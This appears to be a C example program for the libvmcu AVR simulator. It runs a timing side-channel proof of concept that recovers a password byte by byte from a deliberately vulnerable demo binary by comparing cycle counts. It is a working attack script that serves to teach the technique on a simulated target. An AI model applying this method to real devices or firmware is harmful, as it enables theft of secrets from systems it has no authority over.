/* Sidechannel Attack (POC, timing attack) with libvmcu */

// C Headers
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <inttypes.h>

// libvmcu Headers
#include "libvmcu_analyzer.h"
#include "libvmcu_system.h"

#define FILE "vuln.hex"

#define START  0x004d
#define END    0x0089

#define BUFFER 0x0113 
#define LENGTH 0x000f

#define SIGMA_MAX 27

/*
* FILE   := vulnerable binary (vuln.hex)
*
* BUFFER := dataspace start address of 
*           the buffer we want to fuzz
*
* LENGTH := total length of buffer
*
* SIGMA  := number of elements in alphabet sigma
*
* START  := start address of vulnerable code
* END    := end address of vulnerable code
*
* --------------------------------------------------
*
* This driver performs a time based side channel attack
* on a given vulnerable binary.
*
* The binary is a simplified example for a program which
* is vulnerable to timing attacks. It basically compares
* (char by char) a "top secret" password with an input buffer.
*
* Once a missmatch occurs, the program terminates the comparison
* and returns failure for the check.
*
* This little detail allows us to fuzz the input buffer based on
* the duration of a specific execution.
*
* To reach this, the sca driver will
*
* -> create an alphabet sigma of allowed bytes
* -> create an empty char literal called cracked to hold current progress
* -> setup a simulation of vuln.hex
*
* -> iterate over the input field in dataspace (ds) (using index i)
*   -> iterate over alphabet sigma (using index j)
*       -> write previously cracked bytes to input buffer
*       -> insert sigma[j] into input buffer
*       -> simulate until reaching end of check
*       -> if current total cycles > previous total cycles
*           -> then sigma[j] is a better fit for ds[i]
*           -> else sigma[k] is still the best fit for ds[i], with k < j
*       -> reboot system
*   -> set the best fit for cracked[i - BUFFER]
* -> print cracked string
*
**/

const uint8_t sigma[SIGMA_MAX] = {

    'a', 'b', 'c', 'd', 'e', 'f',
    'g', 'h', 'i', 'j', 'k', 'l',
    'm', 'n', 'o', 'p', 'q', 'r',
    's', 't', 'u', 'v', 'w', 'x', 
    'y', 'z', '\0'
};

void fast_forward(vmcu_system_t *sys, const uint32_t addr) {

    while(vmcu_system_get_pc(sys) != addr)
        vmcu_system_step(sys);
}

void write_str_to_ds(vmcu_system_t *sys, const uint16_t addr, char *str, const uint16_t n) {

    for(uint16_t i = addr; i < (addr + n); i++)
        vmcu_system_write_data(sys, i, str[i - addr]);
}

int main(const int argc, const char **argv) {

    if(argc != 2) {

        printf("Usage: ./sca <binary>\n");
        return EXIT_FAILURE;
    }

    vmcu_model_t *m328p = vmcu_model_ctor(VMCU_DEVICE_M328P);

    vmcu_report_t *report = vmcu_analyze_file(FILE, m328p);
    vmcu_system_t *sys    = vmcu_system_ctor(report);

    char cracked[LENGTH] = "";

    for(uint16_t i = BUFFER; i < (BUFFER + LENGTH); i++) {

        uint64_t max_time = 0; uint8_t res_byte = 0xff;

        for(uint16_t j = 0; j < SIGMA_MAX; j++) {
 
            fast_forward(sys, START);
            uint64_t cycle_start = sys->cycles;

            write_str_to_ds(sys, BUFFER, cracked, i - BUFFER);
            vmcu_system_write_data(sys, i, sigma[j]);

            fast_forward(sys, END);
            uint64_t cycle_diff = sys->cycles - cycle_start;

            if(max_time < cycle_diff) {

                max_time = cycle_diff;
                res_byte = sigma[j];    
            }

            vmcu_system_reboot(sys);
        }

        cracked[i - BUFFER] = res_byte;
    }

    printf("cracked buffer: %s\n", cracked);

    vmcu_report_dtor(report);
    vmcu_system_dtor(sys);
    vmcu_model_dtor(m328p);

    return EXIT_SUCCESS;
}
